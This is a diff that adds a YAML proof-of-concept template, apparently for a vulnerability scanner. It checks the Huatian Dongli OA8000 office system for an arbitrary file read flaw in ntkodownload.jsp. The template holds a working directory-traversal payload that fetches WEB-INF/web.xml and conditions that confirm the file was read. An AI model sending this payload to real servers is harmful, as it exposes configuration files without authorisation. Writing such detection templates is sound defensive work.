@@ -1,0 +1,16 @@
+id: poc-yaml-huatiandongli-oa8000-ntkodownload-anyfile-read
+info:
+  name: 华天动力OA8000办公系统 ntkodownload.jsp 任意文件读取漏洞
+  severity: medium
+  tags:
+  - 两高一弱
+  - 目录遍历
+  finger: 华天动力-OA8000
+requests:
+- method: GET
+  path: /OAapp/jsp/trace/ntkodownload.jsp?filename=../../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml
+  expression: "status_code == 200 && \ncontains(body,\"Welcome to Tomcat\") &&\ncontains(body,\"\
+    <?xml version=\\\"1.0\") &&\ncontains(content_type,\"application/octet-stream\"\
+    ) && \ncontains(body,\"www.apache.org\")\n"
+variables: {}
+transport: http
